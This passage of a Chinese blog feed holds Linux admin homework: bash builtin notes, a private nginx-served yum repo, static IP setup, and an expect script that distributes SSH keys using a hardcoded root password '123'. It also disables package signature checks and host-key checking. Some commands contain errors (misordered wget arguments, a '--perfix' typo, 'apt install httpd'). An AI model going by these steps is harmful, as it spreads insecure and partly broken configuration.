#eval命令，单引号失效了，eval命令可以优先解析或执行单引号内的变量或命令</p><p><img src="640-1689661843106-33.png" alt="图片"></p><p> <strong>11、exit退出</strong></p><p>exit #退出命令行，等价于logout，ctrl+d</p><p><img src="640-1689661844654-36.png" alt="图片"></p><p> 退出脚本</p><p><img src="640-1689661848857-39.png" alt="图片"></p><p> <strong>12、export查看或设置全局变量</strong></p><p><strong>export -p #-p打印所有环境变量<img src="640-1689661850700-42.png" alt="图片"></strong></p><p> export MYEVN=7 #设置全局变量</p><p><img src="640-1689661852691-45.png" alt="图片"></p><p> <strong>13、history查看命令历史记录</strong></p><p>history | more #显示所有历史记录</p><p><img src="640-1689661854142-48.png" alt="图片"></p><p> history 10 #查看最近n条的历史记录</p><p><img src="640-1689661855723-51.png" alt="图片"></p><p> history -d 1019 #删除指定的历史记录</p><p><img src="640-1689661857570-54.png" alt="图片"></p><p> history -c #清除所有命令的历史记录</p><p> <img src="640-1689661859739-57.png" alt="图片"></p><p> <strong>14、read交互式赋值变量</strong></p><p>read #等待输入</p><p><img src="640-1689661863961-60.png" alt="图片"></p><p> read one #存储到$one变量内</p><p><img src="640-1689661868901-63.png" alt="图片"></p><p> read one two #接多个变量，输入时空格分割</p><p><img src="640-1689661870966-66.png" alt="图片"></p><p> read -p “请输入你的年龄” age #-p可以定义显示在命令行的提示语句</p><p><img src="640-1689661873712-69.png" alt="图片"></p><p> read -t 3 -p “请输入你的年龄:” age #-t指定等待超时的秒</p><p><img src="640-1689661876759-72.png" alt="图片"></p><p> read -s -p “请输入你的银行卡密码:” pass #-s关闭回显</p><p><img src="640-1689661879104-75.png" alt="图片"></p><p> read -n 3 -p “max=3输入：” num #-n设置输入的最大长度</p><p><img src="640-1689661881295-78.png" alt="图片"></p><p> <strong>15、type判断命令类型</strong></p><p>type ls #显示ls最主要的信息</p><p><img src="640-1689661883907-81.png" alt="图片"></p><p> type -t ls #精简显示命令类型为别名</p><p><img src="640-1689661886517-84.png" alt="图片"></p><p> type -a ls #显示所有相关信息</p><p><img src="640-1689661888596-87.png" alt="图片"></p><p> type cd #显示内置命令类型</p><p><img src="640-1689661890798-90.png" alt="图片"></p><p> <strong>16、umlit修改系统资源使用限制</strong></p><p>ulimit -a #显示当前所有系统资源使用限制</p><p><img src="640-1689661892921-93.png" alt="图片"></p><p>在上面这些参数中，通常我们关注得比较多:</p><p>open files: 一个进程可打开的最大文件数.</p><p>max user processes: 系统允许创建的最大进程数量.</p><p>通过 ps -efL|grep java |wc -l 查看目前java程序的进程数，如果超过限制需要修改</p><p>ulimit -n #查看打开文件的最大数量</p><p><img src="640-1689661895575-96.png" alt="图片"></p><p> ulimit -n 65535 #调整，但之当前窗口生效</p><p><img src="640-1689661897692-99.png" alt="图片"></p><p> echo ‘* - nofile 65535’ &gt;&gt; /etc/security/limits.conf #修改配置永久生效（重新登录窗口）</p><p><img src="640-1689661900079-102.png" alt="图片"></p><p> <strong>17、unset清空变量</strong></p><p>unset MRWHITE MRSLU #将变量值清空</p><p><img src="640-1689661903780-105.png" alt="图片"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>N80第3周作业</title>
    <link href="/2023/07/12/N80%E7%AC%AC3%E5%91%A8%E4%BD%9C%E4%B8%9A/"/>
    <url>/2023/07/12/N80%E7%AC%AC3%E5%91%A8%E4%BD%9C%E4%B8%9A/</url>
    
    <content type="html"><![CDATA[<h1 id="1-搭建私有的yum仓库"><a href="#1-搭建私有的yum仓库" class="headerlink" title="1.搭建私有的yum仓库"></a>1.搭建私有的yum仓库</h1><p>环境：server端 10.0.0.129</p><p>client端 10.0.0.130</p><p>server端本地yum源：/etc/yum.repos.d/base.repo</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">[base]<br>name=base<br>baseurl=https://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/os/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-<span class="hljs-variable">$releasever</span><br><br>[epel]<br>name=epel<br>baseurl=https://mirrors.aliyun.com/epel/<span class="hljs-variable">$releasever</span>/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=https://mirrors.aliyun.com/epel/RPM-GPG-KEY-EPEL-<span class="hljs-variable">$releasever</span><br><br>[extras]<br>name=extras<br>baseurl=https://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/extras/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-<span class="hljs-variable">$releasever</span><br><br>[updates]<br>name=updates<br>baseurl=https://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/updates/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-<span class="hljs-variable">$releasever</span><br></code></pre></td></tr></table></figure><h2 id="安装nginx，添加yum源的web端发布"><a href="#安装nginx，添加yum源的web端发布" class="headerlink" title="安装nginx，添加yum源的web端发布"></a>安装nginx，添加yum源的web端发布</h2><p>添加base，epel，extras，appstream源的发布</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##安装nginx编译依赖包gcc，支持ssl，zlib压缩等</span><br>yum install -y pcre pcre-devel gcc gcc-c++ openssl openssl-devel zlib zlib-devel gd gd-devel<br>wget -O https://nginx.org/download/nginx-1.20.2.tar.gz /data/nginx<br>tar xf nginx-1.20.2.tar.gz<br><br><span class="hljs-comment">##指定nginx安装目录 --prefix</span><br><span class="hljs-built_in">cd</span> nginx-1.20.2 ; ./configure --perfix=/usr/local/nginx<br>make &amp;&amp; make install<br><br>nginx默认目录:/usr/local/nginx/html<br></code></pre></td></tr></table></figure><h3 id="1-配置nginx服务器"><a href="#1-配置nginx服务器" class="headerlink" title="1.配置nginx服务器"></a>1.配置nginx服务器</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">##进入到nginx</span><br><span class="hljs-attribute">vim</span> /usr/local/nginx/conf/nginx.conf<br><br><span class="hljs-comment">##监听端口为8080</span><br>server &#123;<br>        <span class="hljs-attribute">listen</span>       <span class="hljs-number">8080</span>;<br>        <span class="hljs-attribute">server_name</span>  localhost;<br><br>        <span class="hljs-comment">#charset koi8-r;</span><br><br>        <span class="hljs-comment">#access_log  logs/host.access.log  main;</span><br><br><span class="hljs-comment">#        location / &#123;</span><br><span class="hljs-comment">#            root   /repo ;</span><br><span class="hljs-comment">#            index  index.html index.htm;</span><br><span class="hljs-comment">#        &#125;</span><br>    <br>       <span class="hljs-comment">#8080的server默认访问路径</span><br>        <span class="hljs-attribute">root</span> /usr/local/nginx/html/repo;<br>        <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;<br><br>        <span class="hljs-comment">#error_page  404              /404.html;</span><br><br>        <span class="hljs-comment"># redirect server error pages to the static page /50x.html</span><br>        <span class="hljs-comment">#</span><br>        <span class="hljs-attribute">error_page</span>   <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span>  /50x.html;<br>        <span class="hljs-section">location</span> = /50x.html &#123;<br>            <span class="hljs-attribute">root</span>   html;<br>        &#125;<br><br><span class="hljs-comment">##重启服务</span><br>./<span class="hljs-attribute">nginx</span> -s reload<br></code></pre></td></tr></table></figure><h3 id="2-访问站点查看是否生效：10-0-0-129-8080"><a href="#2-访问站点查看是否生效：10-0-0-129-8080" class="headerlink" title="2.访问站点查看是否生效：10.0.0.129:8080"></a>2.访问站点查看是否生效：10.0.0.129:8080</h3><p><img src="2792175-20220829233301730-967891704-1689170064935-16.png" alt="image-20220813113330186"></p><h2 id="在server端搭建yum源"><a href="#在server端搭建yum源" class="headerlink" title="在server端搭建yum源"></a>在server端搭建yum源</h2><h3 id="1-同步本地的yum源packages到repo目录"><a href="#1-同步本地的yum源packages到repo目录" class="headerlink" title="1.同步本地的yum源packages到repo目录"></a>1.同步本地的yum源packages到repo目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##reposync：yum源同步工具，同步到对应的nginx发布中，同步现有的base源内的内容</span><br><span class="hljs-comment">##repo指的是同步本地的yum源到这个发布目录</span><br>reposync -r base -p /usr/local/nginx/html/repo<br></code></pre></td></tr></table></figure><p><img src="2792175-20220829233302113-559632610.png" alt="image-20220813082226420"></p><h3 id="2-创建源数据"><a href="#2-创建源数据" class="headerlink" title="2.创建源数据"></a>2.创建源数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##创建源数据，这个路径以后就放repo文件的</span><br>[10:55:20 root@slave1 repo]<span class="hljs-comment">#createrepo /usr/local/nginx/html/repo/base</span><br>Spawning worker 0 with 10072 pkgs<br>Workers Finished<br>Saving Primary metadata<br>Saving file lists metadata<br>Saving other metadata<br>Generating sqlite DBs<br>Sqlite DBs complete<br></code></pre></td></tr></table></figure><p><img src="2792175-20220829233302404-1862708411.png" alt="image-20220813105749148"></p><h3 id="3-制作yum源文件"><a href="#3-制作yum源文件" class="headerlink" title="3.制作yum源文件"></a>3.制作yum源文件</h3><p>这里制作yum源文件的时候，由于只有一个base.repo，所以包括base库，extras库，updates库，epel库都写在一起，用于给其他的client获取，地址写本机的IP地址10.0.0.129</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##制作repo文件</span><br>vim /usr/local/nginx/html/repo/base.repo<br><br><span class="hljs-comment"># 不需要的仓库可以注释掉</span><br><span class="hljs-comment"># 内网仓库全部关闭gpgcheck校验</span><br><span class="hljs-comment"># 实现base仓库</span><br><span class="hljs-comment"># base仓库</span><br>[base]<br>name=Local CentOS-7  Base<br>baseurl=http://10.0.0.129/base<br>enabled=1<br>gpgcheck=0<br><br><span class="hljs-comment"># extras仓库</span><br>[extras]<br>name=Local CentOS-7  Extras<br>baseurl=http://10.0.0.129/base<br>enabled=1<br>gpgcheck=0<br><br><span class="hljs-comment"># updates仓库</span><br>[updates]<br>name=Local CentOS-7  Updates<br>baseurl=http://10.0.0.129/base<br>enabled=1<br>gpgcheck=0<br><br><span class="hljs-comment"># epel仓库</span><br>[epel]<br>name=Local Extra Packages <span class="hljs-keyword">for</span> Enterprise Linux 7<br>baseurl=http://10.0.0.129/base<br>enabled=1<br>gpgcheck=0<br><span class="hljs-comment">#查看本地的yum仓库情况</span><br>yum repolist<br></code></pre></td></tr></table></figure><h2 id="client测试yum仓库"><a href="#client测试yum仓库" class="headerlink" title="client测试yum仓库"></a>client测试yum仓库</h2><p>yum源文件必须放在/etc/yum.repos.d才生效，记得加上10.0.0.129:8080端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##备份yum源</span><br><span class="hljs-built_in">mkdir</span> /etc/yum.repos.d/backup<br><span class="hljs-built_in">mv</span> /etc/yum.repos.d/* backup<br><br><span class="hljs-comment">##从server端获取yum源，curl -o指定目标路径</span><br>curl -o /etc/yum.repos.d/base.repo http://10.0.0.129:8080/base.repo<br><br><span class="hljs-comment">##构建缓存，查看yum仓库</span><br>yum clean all ; yum makecache ; yum repolist<br></code></pre></td></tr></table></figure><p><img src="2792175-20220829233302656-2120721422.png" alt="image-20220813114310972"></p><p>查看bind-utils有无，测试，证明yum源搭建成功</p><p><img src="2792175-20220829233302928-1818630760.png" alt="image-20220813114432789"></p><h1 id="2-阅读《图解TCP-IP》一书"><a href="#2-阅读《图解TCP-IP》一书" class="headerlink" title="2.阅读《图解TCP/IP》一书"></a>2.阅读《图解TCP/IP》一书</h1><p>地址：<a href="https://leon-wtf.github.io/doc/%E5%9B%BE%E8%A7%A3TCPIP.pdf">https://leon-wtf.github.io/doc/%E5%9B%BE%E8%A7%A3TCPIP.pdf</a>，有时间的可以写下读书笔记</p><h1 id="3-TCP三次挥手-四次挥手"><a href="#3-TCP三次挥手-四次挥手" class="headerlink" title="3.TCP三次挥手/四次挥手"></a>3.TCP三次挥手/四次挥手</h1><p><img src="2792175-20220829233303258-1222522951.jpg" alt="TCP四次挥手"></p><p><img src="2792175-20220829233303608-1362044458.jpg" alt="TCP三次挥手"></p><h1 id="4-静态配置网卡IP，centos-ubuntu实现"><a href="#4-静态配置网卡IP，centos-ubuntu实现" class="headerlink" title="4.静态配置网卡IP，centos/ubuntu实现"></a>4.静态配置网卡IP，centos/ubuntu实现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##centos7,8</span><br>vim /etc/sysconfig/network-scripts/ifcfg-ens33<br>BOOTPROTO=<span class="hljs-string">&quot;static&quot;</span><br>IPADDR=10.0.0.128<br>PREFIX=24<br>GATEWAY=10.0.0.2<br>DNS1=114.114.114.114<br>DNS2=8.8.8.8<br>centos7：systemctl restart network<br>centos8：nmcli connection down ens160 &amp;&amp; nmcli connection up ens160<br><br><span class="hljs-comment">##ubuntu</span><br><span class="hljs-comment">##已提前改过名字</span><br>vim /etc/netplan/ifcfg-ens33.yaml<br><span class="hljs-comment"># This is the network config written by &#x27;subiquity&#x27;</span><br>network:<br>  ethernets:<br>    ens33:<br>      addresses: [10.0.0.131/24]<br>      gateway4: 10.0.0.2<br>      nameservers:<br>              addresses: [114.114.114.114,8.8.8.8]<br>      dhcp4: no<br>  version: 2<br></code></pre></td></tr></table></figure><h1 id="5-实现脚本功能"><a href="#5-实现脚本功能" class="headerlink" title="5.实现脚本功能"></a>5.实现脚本功能</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">########################################</span><br><span class="hljs-comment">#Author:Catyer</span><br><span class="hljs-comment">#time:2022-08-07_14:53:44</span><br><span class="hljs-comment">#filename:scp.sh</span><br><span class="hljs-comment">#Script description:</span><br><span class="hljs-comment">#实现免密登陆脚本, expect登陆远程主机，将生成的密钥写入到目标主机, expect测试远程登陆。</span><br><span class="hljs-comment">#1）通过shift读取脚本参数</span><br><span class="hljs-comment">#2）通过select来选择功能.例如功能有</span><br><span class="hljs-comment">#- 安装mysql</span><br><span class="hljs-comment">#- 安装apache</span><br><span class="hljs-comment">#- 免密钥登陆主机</span><br><span class="hljs-comment">#当前我们只实现免密钥登陆主机</span><br><span class="hljs-comment">#3）通过函数封装每个功能</span><br><span class="hljs-comment">#4）将免密钥登陆的过程可以重复进行, while 循环实现重复，需要有退出过程。当用户输入exit时，退出免密钥功能。</span><br><span class="hljs-comment">#5）支持输入一批主机免密钥，使用数组 实现</span><br><span class="hljs-comment">########################################</span><br><br><span class="hljs-comment">##引用function功能</span><br>. /etc/init.d/functions<br> <br><br><span class="hljs-function"><span class="hljs-title">MYSQL</span></span>()&#123;<br><span class="hljs-comment">##二进制安装mysql</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;MYSQL&quot;</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-title">APACHE</span></span>()&#123;<br><br>OS=`awk -F= <span class="hljs-string">&#x27;/ID/&#123;print $2&#125;&#x27;</span> /etc/os-release | <span class="hljs-built_in">head</span> -n 1 | sed <span class="hljs-string">&#x27;s/\&quot;//g&#x27;</span>`<br><span class="hljs-comment">##yum安装Apache</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$OS</span> == <span class="hljs-string">&quot;centos&quot;</span> ] ;<span class="hljs-keyword">then</span><br>        rpm -q httpd &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;apache install&quot;</span> || yum -y install httpd;systemctl <span class="hljs-built_in">enable</span> --now httpd<br> <span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$OS</span> == <span class="hljs-string">&quot;ubuntu&quot;</span> ] ;<span class="hljs-keyword">then</span><br>        <span class="hljs-comment">##ubuntu自动启动服务</span><br>        apt list --installed | grep httpd &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ubuntu httpd is installed&quot;</span> || apt update; apt -y install httpd <br>        <span class="hljs-keyword">else</span><br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;invalid <span class="hljs-variable">$OS</span>&quot;</span>   <br>    <span class="hljs-keyword">fi</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;httpd test&quot;</span> &gt; /var/www/html/index.html<br>    curl 127.0.0.1:80<br>&#125;<br><br><span class="hljs-comment">##使用SSHPASS功能</span><br><span class="hljs-comment">#SSHPASS()&#123;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#pass1=123</span><br><span class="hljs-comment">#IP=(10.0.0.129</span><br><span class="hljs-comment">#10.0.0.130</span><br><span class="hljs-comment">#10.0.0.131</span><br><span class="hljs-comment">#10.0.0.132)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#echo &quot;目标主机:$&#123;IP[*]&#125;&quot;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#cd /root &amp;&amp; rm -rf .ssh</span><br><span class="hljs-comment">###生成自己的密钥，-p &quot;&quot;空密码，-f路径</span><br><span class="hljs-comment">#ssh-keygen -P &quot;&quot; -f /root/.ssh/id_rsa &amp;&gt;/dev/null</span><br><span class="hljs-comment">###判断sshpass是否安装</span><br><span class="hljs-comment">#rpm -q sshpass &amp;&amp; echo &quot;sshpass already install&quot; || yum update;yum -y install sshpass</span><br><span class="hljs-comment">#for i in $&#123;IP[*]&#125;;do</span><br><span class="hljs-comment">#        sshpass -p $pass1 ssh-copy-id -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa.pub $i</span><br><span class="hljs-comment">#ssh $i &quot;echo `hostname -I`&quot; &amp;&amp; echo &quot;$i ssh-keygen执行成功&quot; || echo &quot;failed&quot;</span><br><span class="hljs-comment">#done</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#&#125;</span><br><br><span class="hljs-function"><span class="hljs-title">EXPECT</span></span>()&#123;<br><br>host=(<br>10.0.0.129<br>10.0.0.130<br>10.0.0.131<br>10.0.0.132<br>)<br><br>pass1=123<br><br><span class="hljs-comment">##本机删除掉SSH秘钥</span><br><span class="hljs-built_in">cd</span> /root ; <span class="hljs-built_in">rm</span> -rf .ssh<br>ssh-keygen -P <span class="hljs-string">&quot;&quot;</span> -f /root/.ssh/id_rsa &amp;&gt;/dev/null<br><br><span class="hljs-comment">##定义x的值</span><br>x=0<br><br><span class="hljs-comment">##x值小于等于数组长度，执行循环，包括数组最大长度</span><br><span class="hljs-keyword">while</span> [ <span class="hljs-variable">$x</span> -le <span class="hljs-variable">$&#123;#host[*]&#125;</span> ] ; <span class="hljs-keyword">do</span><br>i=<span class="hljs-variable">$&#123;host[$x]&#125;</span> <span class="hljs-comment">##数组对应下标元素(IP)赋值给i变量</span><br><br><span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">EXPECT选项</span><br><span class="hljs-string">1.expect:执行免秘钥</span><br><span class="hljs-string">2.exit:退出</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;please input your choice:&quot;</span> choice<br><span class="hljs-keyword">case</span> <span class="hljs-variable">$choice</span> <span class="hljs-keyword">in</span><br>1|<span class="hljs-string">&quot;expect&quot;</span>)<br><br><span class="hljs-comment">##再次判断一次x的值，如果小于数组长度，则退出；不包括数组最大长度，当x达到数组最大长度，则不执行以下循环，退出</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$x</span> -lt <span class="hljs-variable">$&#123;#host[*]&#125;</span> ];<span class="hljs-keyword">then</span><br><span class="hljs-built_in">let</span> x++ <br>expect &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">spawn ssh-copy-id root@$i</span><br><span class="hljs-string">expect &#123;</span><br><span class="hljs-string">&quot;yes/no&quot; &#123;send &quot;yes\n&quot;;exp_continue&#125;</span><br><span class="hljs-string">&quot;password&quot; &#123;send &quot;$pass1\n&quot;&#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">expect eof</span><br><span class="hljs-string">EOF</span><br><span class="hljs-comment">##调用action</span><br>action <span class="hljs-string">&quot;主机<span class="hljs-variable">$i</span> SSH成功&quot;</span> <span class="hljs-literal">true</span><br><br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;已经达到数组最大长度，退出&quot;</span><br><span class="hljs-built_in">break</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment">#let x++</span><br>;;<br><br>2|<span class="hljs-string">&quot;exit&quot;</span>) <span class="hljs-built_in">break</span> ;; <span class="hljs-comment">##退出函数，可以在两次expect之间退出</span><br><br><span class="hljs-keyword">esac</span><br><span class="hljs-keyword">done</span><br><br>&#125;<br><br><br><span class="hljs-keyword">while</span> :<br><span class="hljs-keyword">do</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;输入想要实现的功能：&quot;</span><br>select order <span class="hljs-keyword">in</span> 安装MySQL 安装apache EXPECT测试 EXIT退出;<span class="hljs-keyword">do</span><br><span class="hljs-keyword">case</span> <span class="hljs-variable">$REPLY</span> <span class="hljs-keyword">in</span><br>    1)  MYSQL ;;<br>    2)  APACHE ;;<br>    3)  EXPECT ;;<br>    4)  <span class="hljs-built_in">exit</span> 2 ;; <span class="hljs-comment">##退出两层循环</span><br>    <span class="hljs-keyword">esac</span><br><span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><h2 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h2><p><img src="2792175-20220829233303908-827520535.png" alt="image-20220813122734744"></p><h2 id="执行安装Apache-已安装"><a href="#执行安装Apache-已安装" class="headerlink" title="执行安装Apache(已安装)"></a>执行安装Apache(已安装)</h2><p><img src="2792175-20220829233304177-1832190788.png" alt="image-20220813122822678"></p><h2 id="执行安装-Apache-未安装"><a href="#执行安装-Apache-未安装" class="headerlink" title="执行安装 Apache(未安装)"></a>执行安装 Apache(未安装)</h2><p><img src="2792175-20220829233304473-1420285605.png" alt="image-20220813122942630"></p><p><img src="2792175-20220829233304783-458186798.png" alt="image-20220813122954319"></p><h2 id="执行第一次expect"><a href="#执行第一次expect" class="headerlink" title="执行第一次expect"></a>执行第一次expect</h2><p><img src="2792175-20220829233305075-1166941197.png" alt="image-20220813123029478"></p><p>测试scp文件是否能够免秘钥传输到10.0.0.129</p><p><img src="2792175-20220829233305396-1074827230.png" alt="image-20220813123138302"></p><h2 id="执行第二次expect"><a href="#执行第二次expect" class="headerlink" title="执行第二次expect"></a>执行第二次expect</h2><p><img src="2792175-20220829233305683-642639962.png" alt="image-20220813123213314"></p><h2 id="达到数据长度上限，退出脚本"><a href="#达到数据长度上限，退出脚本" class="headerlink" title="达到数据长度上限，退出脚本"></a>达到数据长度上限，退出脚本</h2><p><img src="2792175-20220829233305979-1448480157.png" alt="image-20220813123305069"></p>]]></content>
    
    
    <categories>
      
